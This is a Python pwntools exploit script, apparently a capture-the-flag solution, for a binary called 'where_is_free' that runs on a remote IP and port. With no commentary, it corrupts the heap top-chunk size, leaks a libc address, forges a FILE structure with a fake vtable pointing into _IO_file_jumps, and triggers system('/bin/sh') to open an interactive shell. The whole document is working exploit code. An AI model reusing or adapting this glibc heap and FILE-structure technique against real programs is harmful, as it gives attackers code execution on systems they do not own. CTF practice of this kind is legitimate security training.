#exploit for whereisfree
#h4c(more_hard_c&n_free)
from pwn import *
import time
elf = ELF("./where_is_free")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
target=remote('112.213.2.13',40006)
#context.log_level='DEBUG'
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(size,data="A"):
	sla("input number:\n",str(1))
	sla("input size\n",str(size))
	sa("input content\n",data)
	
def edit(index,size,data):
	sla("input number:\n",str(2))
	sla("choose index:\n",str(index))
	sla("input edit size:\n",str(size))
	sa("edit contents:\n",data)

def show(index):
	sla("input number:\n",str(3))
	sla("choose index\n",str(index))
	target.recvline()
	leaks=target.recvline().strip("\n")
	return leaks
	
def exit():
	sla("input number:\n",str(4))

add(0x3f0)
payload="A"*0x3f0+p64(0)+p64(0xc01)
edit(0,0x400,payload)
add(0x1000)
add(0x40)
libc_base=u64(show(2).ljust(8,"\x00"))-0x3c5141
libc_io_list_all=libc_base+libc.symbols["_IO_list_all"]
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()+5
io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 3*8
fileStr=FileStructure(libc_malloc_hook)
fileStr._IO_read_ptr=0x61
fileStr._IO_read_base=libc_io_list_all-0x10
fileStr._IO_buf_base = 0
fileStr._IO_buf_end = (libc_binsh-100)/2
fileStr._IO_write_ptr = libc_malloc_hook
fileStr._IO_write_base = 0
fileStr.vtable=fake_vtable_addr
payload="A"*0x40
payload+=str(fileStr)
payload+=p64(libc_system)
edit(2,len(payload),payload)
add(0x10)
target.interactive()
